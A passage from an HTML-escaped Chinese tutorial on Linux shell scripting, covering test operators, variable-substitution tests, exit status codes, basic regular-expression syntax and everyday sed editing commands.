&lt;thead&gt;
&lt;tr&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;运算符&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;说明&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;举例&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;iexcl;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;非运算，表达式为 true 则返回 false，否则返回 true。&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;[ ! false ] 返回 true。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;-o&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;或运算，有一个表达式为 true 则返回 true。&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;[ $a -lt 20 -o $b -gt 100 ] 返回 true。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;-a&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;与运算，两个表达式都为 true 才返回 true。&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;[ $a -lt 20 -a $b -gt 100 ] 返回 false。&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
逻辑运算符
&lt;/p&gt;
&lt;table border=&quot;2&quot; cellspacing=&quot;0&quot; cellpadding=&quot;6&quot; rules=&quot;groups&quot; frame=&quot;hsides&quot;&gt;
&lt;caption class=&quot;t-above&quot;&gt;&lt;span class=&quot;table-number&quot;&gt;Table 22:&lt;/span&gt; 逻辑运算符&lt;/caption&gt;

&lt;colgroup&gt;
&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;
&lt;/colgroup&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;运算符&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;说明&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;举例&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;amp;&amp;amp;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;逻辑的 AND&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;[ $a -lt 100 &amp;amp;&amp;amp; $b -gt 100 ] 返回 false&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;||&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;逻辑的 OR&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;[ $a -lt 100 || $b -gt 100 ] 返回 true&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;
注意：“|”，可通过 M-x org-entities-help &amp;lt;RET&amp;gt; 查看，Other &amp;gt; Misc
&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
字符串运算符
&lt;/p&gt;
&lt;table border=&quot;2&quot; cellspacing=&quot;0&quot; cellpadding=&quot;6&quot; rules=&quot;groups&quot; frame=&quot;hsides&quot;&gt;
&lt;caption class=&quot;t-above&quot;&gt;&lt;span class=&quot;table-number&quot;&gt;Table 23:&lt;/span&gt; 字符串运算符&lt;/caption&gt;

&lt;colgroup&gt;
&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;
&lt;/colgroup&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;运算符&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;说明&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;举例&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;=&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;检测两个字符串是否相等，相等返回 true。&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;[ $a = $b ] 返回 false。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;!=&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;检测两个字符串是否相等，不相等返回 true。&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;[ $a != $b ] 返回 true。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;-z&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;检测字符串长度是否为0，为0返回 true。&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;[ -z $a ] 返回 false。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;-n&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;检测字符串长度是否为0，不为0返回 true。&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;[ -n &quot;$a&quot; ] 返回 true。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;$&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;检测字符串是否为空，不为空返回 true。&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;[ $a ] 返回 true。&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
文件测试运算符
&lt;/p&gt;
&lt;table border=&quot;2&quot; cellspacing=&quot;0&quot; cellpadding=&quot;6&quot; rules=&quot;groups&quot; frame=&quot;hsides&quot;&gt;
&lt;caption class=&quot;t-above&quot;&gt;&lt;span class=&quot;table-number&quot;&gt;Table 24:&lt;/span&gt; 文件测试运算符&lt;/caption&gt;

&lt;colgroup&gt;
&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;
&lt;/colgroup&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;操作符&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;说明&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;举例&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;-b file&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;检测文件是否是块设备文件，如果是，则返回 true。&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;[ -b $file ] 返回 false。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;-c file&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;检测文件是否是字符设备文件，如果是，则返回 true。&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;[ -c $file ] 返回 false。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;-d file&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;检测文件是否是目录，如果是，则返回 true。&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;[ -d $file ] 返回 false。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;-f file&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;检测文件是否是普通文件（既不是目录，也不是设备文件），如果是，则返回 true。&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;[ -f $file ] 返回 true。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;-g file&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;检测文件是否设置了 SGID 位，如果是，则返回 true。&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;[ -g $file ] 返回 false。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;-k file&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;检测文件是否设置了粘着位(Sticky Bit)，如果是，则返回 true。&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;[ -k $file ] 返回 false。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;-p file&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;检测文件是否是有名管道，如果是，则返回 true。&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;[ -p $file ] 返回 false。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;-u file&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;检测文件是否设置了 SUID 位，如果是，则返回 true。&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;[ -u $file ] 返回 false。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;-r file&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;检测文件是否可读，如果是，则返回 true。&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;[ -r $file ] 返回 true。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;-w file&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;检测文件是否可写，如果是，则返回 true。&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;[ -w $file ] 返回 true。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;-x file&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;检测文件是否可执行，如果是，则返回 true。&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;[ -x $file ] 返回 true。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;-s file&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;检测文件是否为空（文件大小是否大于0），不为空返回 true。&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;[ -s $file ] 返回 true。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;-e file&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;检测文件（包括目录）是否存在，如果是，则返回 true。&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;[ -e $file ] 返回 true。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;-S&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;判断某文件是否 socket。&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;-L&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;检测文件是否存在并且是一个符号链接。&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgabff7c1&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;orgabff7c1&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;4.2.11&lt;/span&gt; 变量测试&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-4-2-11&quot;&gt;
&lt;p&gt;
变量测试主要在 Shell 中使用，其它绝大多数语言是没有这个概念的，通用度不高。而且变量测试比较复杂，在实际写脚本的过程中完全可以用其它方式来取代变量测试。
&lt;/p&gt;
&lt;table border=&quot;2&quot; cellspacing=&quot;0&quot; cellpadding=&quot;6&quot; rules=&quot;groups&quot; frame=&quot;hsides&quot;&gt;
&lt;caption class=&quot;t-above&quot;&gt;&lt;span class=&quot;table-number&quot;&gt;Table 25:&lt;/span&gt; 变量测试表&lt;/caption&gt;

&lt;colgroup&gt;
&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;
&lt;/colgroup&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;变量置换方式&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;y 没有设置&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;y 为空&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;y 设置值&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;x=${y-变量}&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;x=newValue&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;x为空&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;x=$y&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;x=${y:-变量}&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;x=newValue&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;x=newValue&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;x=$y&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;x=${y+变量}&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;x为空&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;x=newValue&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;x=newValue&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;x=${y:-变量}&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;x为空&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;x为空&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;x=newValue&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;x=${y=变量}&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;x=newValue&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;x为空&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;x=$y&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;y=newValue&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;y值不变&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;y值不变&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;x=${y:=变量}&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;x=newValue&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;x=newValue&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;x=$y&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;y=newValue&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;y=newValue&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;y值不变&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;x=${y?变量}&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;newValue 输出到标准错误输出&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;x为空&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;x=$y&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;x=${y:?变量}&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;newValue 输出到标准错误输出&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;newValue 输出到标准错误输出&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;x=$y&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;

&lt;pre class=&quot;example&quot;&gt;
x=${y-4}
// 表示如果y不存在，那么x=4；如果y为空值，那么x为空值；如果y有值，那么x被赋y的值。

&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgcc830ba&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;orgcc830ba&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;4.2.12&lt;/span&gt; 退出脚本&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-4-2-12&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;&lt;p&gt;
退出状态码       
&lt;/p&gt;
&lt;table border=&quot;2&quot; cellspacing=&quot;0&quot; cellpadding=&quot;6&quot; rules=&quot;groups&quot; frame=&quot;hsides&quot;&gt;
&lt;caption class=&quot;t-above&quot;&gt;&lt;span class=&quot;table-number&quot;&gt;Table 26:&lt;/span&gt; 退出状态码&lt;/caption&gt;

&lt;colgroup&gt;
&lt;col  class=&quot;org-right&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;
&lt;/colgroup&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-right&quot;&gt;状态码&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;0&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;命令成功结束&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;1&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;一般性未知错误&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;2&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;不适合的shell命令&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;126&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;命令不可执行&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;127&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;没找到命令&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;128&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;无效的退出参数&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;128+x&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;与Linux信号x相关的严重错误&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;130&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;通过Ctrl+C终止的命令&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;255&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;正常范围之外的退出状态码&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;pre class=&quot;example&quot;&gt;
$ echo $?
0

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
exit
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot; id=&quot;orgb5e64e6&quot;&gt;&lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color: #CDC673;&quot;&gt;'Hello, World'&lt;/span&gt;
&lt;span style=&quot;color: #FF1493;&quot;&gt;exit&lt;/span&gt; 5 
&lt;/pre&gt;
&lt;/div&gt;

&lt;pre class=&quot;example&quot;&gt;
$ ./test 
Hello, World
$ echo $?
5

&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org1c4f6cf&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org1c4f6cf&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;4.3&lt;/span&gt; Shell Programming&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-4-3&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgf4f2256&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;orgf4f2256&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;4.3.1&lt;/span&gt; 正则表达式&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-4-3-1&quot;&gt;
&lt;table border=&quot;2&quot; cellspacing=&quot;0&quot; cellpadding=&quot;6&quot; rules=&quot;groups&quot; frame=&quot;hsides&quot;&gt;
&lt;caption class=&quot;t-above&quot;&gt;&lt;span class=&quot;table-number&quot;&gt;Table 27:&lt;/span&gt; 正则表达式的基本组成部分&lt;/caption&gt;

&lt;colgroup&gt;
&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;
&lt;/colgroup&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;正则表达式&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;描述&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;示例&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;\&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;转义符，将特殊字符进行转义，忽略其特殊意义&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;a\.b匹配a.b，但不能匹配ajb，.被转义为特殊意义&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;^&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;匹配行首，awk中，^则是匹配字符串的开始&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;^tux匹配以tux开头的行&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;$&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;匹配行尾，awk中，$则是匹配字符串的结尾&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;tux$匹配以tux结尾的行&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;.&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;匹配除换行符\n之外的任意单个字符，awk则中可以&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;ab.匹配abc或bad，不可匹配abcd或abde，只能匹配单字符&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;[]&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;匹配包含在[字符]之中的任意一个字符&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;coo[kl]可以匹配cook或cool&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;[^]&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;匹配[^字符]之外的任意一个字符&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;123[^45]不可以匹配1234或1235，1236、1237都可以&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;[-]&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;匹配[]中指定范围内的任意一个字符，要写成递增&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;[0-9]可以匹配1、2或3等其中任意一个数字&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;?&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;匹配之前的项1次或者0次&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;colou?r可以匹配color或者colour，不能匹配colouur不支持&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;+&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;匹配之前的项1次或者多次&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;sa-6+匹配sa-6、sa-666，不能匹配sa-不支持&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;lowast;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;匹配之前的项0次或者多次&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;co*l匹配cl、col、cool、coool等&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;()&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;匹配表达式，创建一个用于匹配的子串&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;ma(tri)?匹配max或maxtrix不支持()()()&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;{n}&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;匹配之前的项n次，n是可以为0的正整数&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;[0-9]{3}匹配任意一个三位数，可以扩展为[0-9][0-9][0-9]不支持&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;{n,}&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;之前的项至少需要匹配n次&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;[0-9]{2,}匹配任意一个两位数或更多位数不支持&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;{n,m}&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;指定之前的项至少匹配n次，最多匹配m次，n&amp;lt;=m&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;[0-9]{2,5}匹配从两位数到五位数之间的任意一个数字不支持&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;|&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;交替匹配 | 两边的任意一项ab(c&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;d)匹配abc或abd不支持&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;
参考：&lt;a href=&quot;https://man.linuxde.net/docs/shell_regex.html&quot;&gt;https://man.linuxde.net/docs/shell_regex.html&lt;/a&gt;
&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org9d1e0be&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org9d1e0be&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;4.3.2&lt;/span&gt; 字符操作&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-4-3-2&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;&lt;p&gt;
sed
&lt;br /&gt;
一款几乎包括所有 UNIX 体系的轻量级流编辑器，主要用来进行数据的提取、替换、删除、新增。
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
// 查看文件的第2行
$ sed -n '2p' test.txt

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
// 删除从第2行到第4行的数据
$ sed '2,4d' test.txt

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
// 在第2行追加hello
$ sed '2a hello' test.txt

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
// 在第2行前插入两行数据
$ sed '2i hello \
wold' test.txt

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
// 数据替换
$ sed '2c No such person' test.txt

&lt;/pre&gt;
&lt;p&gt;
&lt;b&gt;字符串替换&lt;/b&gt;
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sed 's/oldStr/newStr/g' fileName
// 将某个目录下的所有文件中的某个字符进行替换成新字符串，格式如下：
$ sed -i 's/oldStr/newStr/g' `grep oldStr -rl /path`

&lt;/pre&gt;&lt;/li&gt;
